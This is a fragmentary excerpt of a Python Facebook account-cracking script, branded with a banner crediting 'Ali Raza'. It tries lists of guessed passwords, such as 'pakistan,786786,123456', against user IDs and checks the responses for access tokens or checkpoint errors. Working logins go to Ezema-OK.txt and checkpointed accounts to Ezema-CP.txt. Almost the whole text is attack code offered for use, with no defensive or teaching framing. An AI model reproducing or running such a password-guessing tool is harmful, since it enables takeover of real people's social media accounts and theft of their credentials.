...
\033[1;37;40m┌──────────────────────┐
\033[1;37;40m│ ® Script By Ali Raza ® |
\033[1;37;40m└──────────────────────┘
  ...
  try:
    for pw in passs:
      ...
      if re.search('(EAAA)\w+', str(response.text)):
        print('\x1b[0;32m[\x1b[0;37mEzema-OK\x1b[0;32m] %s • %s '%(str(user), str(pw)))
        break
      elif 'www.facebook.com' in response.json()['error_msg']:
        print('\x1b[0;33m[\x1b[0;37mEzema-CP\x1b[0;33m] %s • %s '%(str(user), str(pw)))
        break
  except: pass
		...
		while True:
			...
			if f=="":continue
				...
				try:
					...
					print(("   %s"%e))
					continue
				print((k+"["+p+"•"+k+"]"+p+" Example : pakistan,786786,123456"))
				self.pwlist()
				break
			elif f=="d":
				try:
					...
					print(("   %s"%e))
				print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [Ezema-OK] Saved to : Ezema-OK.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [Ezema-CP] Saved to : Ezema-CP.txt\n"))
		...
		try:
			for i in fl.get("pw"):
				...
				if log.get("status")=="cp":
					print(("\r\x1b[0;33m[\x1b[0;37mEzema-CP\x1b[0;33m] %s • %s               "%(fl.get("id"),i)))
					self.cp.append("%s • %s"%(fl.get("id"),i))
					open("Ezema-CP.txt","a+").write(
						"%s • %s\n"%(fl.get("id"),i))
					break
				elif log.get("status")=="success":
					print(("\r\x1b[0;32m[\x1b[0;37mEzema-OK\x1b[0;32m] %s • %s               "%(fl.get("id"),i)))
		...
		try:
			for i in fl.get("pw"):
				...
				if log.get("status")=="cp":
					...
					print(("\r\x1b[0;33m[\x1b[0;37mEzema-CP\x1b[0;33m] %s • %s • %s\x1b[0m   "%(fl.get("id"),i,str(ttl))))
					self.cp.append("%s • %s"%(fl.get("id"),i))
					open("Ezema-CP.txt","a+").write(
						"%s • %s • %s\n"%(fl.get("id"),i,str(ttl)))
					break
